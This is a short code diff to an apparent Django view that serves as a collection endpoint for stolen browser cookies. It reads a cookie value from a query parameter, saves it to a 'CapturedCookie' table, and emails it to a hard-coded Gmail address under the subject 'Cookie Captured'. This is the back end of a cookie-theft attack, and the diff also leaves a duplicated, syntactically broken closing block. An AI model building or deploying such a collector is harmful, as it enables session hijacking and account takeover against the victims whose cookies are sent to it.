@@ -57,12 +57,19 @@ def collect(request):
     cookie_value = request.GET.get('c', '')
 
     if cookie_value:
+        # حفظ الكوكيز في قاعدة البيانات
+        CapturedCookie.objects.create(cookie=cookie_value)
+
+        # إرسال الكوكيز على الإيميل
         send_mail(
             subject="Cookie Captured",
             message=f"New cookie captured: {cookie_value}",
             from_email="rihemrihem21000@gmail.com",
             recipient_list=["rihemrihem21000@gmail.com"],
             fail_silently=False,
+        )
+
+    return HttpResponse("OK")
         )
 
     return HttpResponse("OK")
